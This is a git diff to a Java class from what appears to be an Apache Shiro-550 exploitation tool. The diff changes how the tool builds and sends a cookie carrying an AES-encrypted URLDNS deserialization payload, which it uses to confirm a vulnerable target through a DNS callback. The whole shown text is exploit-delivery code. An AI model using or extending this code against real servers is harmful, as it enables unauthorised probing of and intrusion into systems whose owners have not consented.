@@ -4,7 +4,6 @@ import com.y5neko.shiroexp.misc.DnslogConfig;
 import com.y5neko.shiroexp.misc.Tools;
 import com.y5neko.shiroexp.gadget.URLDNS;
 import com.y5neko.shiroexp.request.HttpRequest;
-import com.y5neko.shiroexp.request.ResponseOBJ;
 import okhttp3.FormBody;
 
 import javax.crypto.BadPaddingException;
@@ -37,11 +36,11 @@ public class Shiro550VerifyByURLDNS {
         String payload = Tools.CBC_Encrypt(targetOBJ.getKey(), Base64.getEncoder().encodeToString(URLDNS_Payload));
 //        System.out.println(payload);
         // 在自定义Cookie后添加Cookie字段(cookie;rememberMe=test123)
-        Map<String, String> headers = targetOBJ.getCookie();
-        headers.compute("Cookie", (k, cookie) -> cookie + ";" + targetOBJ.getRememberMeFlag() + "=" + payload);
+        Map<String, String> headers = new HashMap<>();
+        headers.put("Cookie", ";" + targetOBJ.getRememberMeFlag() + "=" + payload);
 
         // 发送payload
-        HttpRequest.httpRequest(targetOBJ.getUrl(), new FormBody.Builder().build(), headers, "GET");
+        HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers, "GET");
 
         // 延时5s进行查询，防止延时误报
         System.out.println("[" + Tools.color("INFO", "BLUE") + "] 正在验证，延时3秒防止漏报");
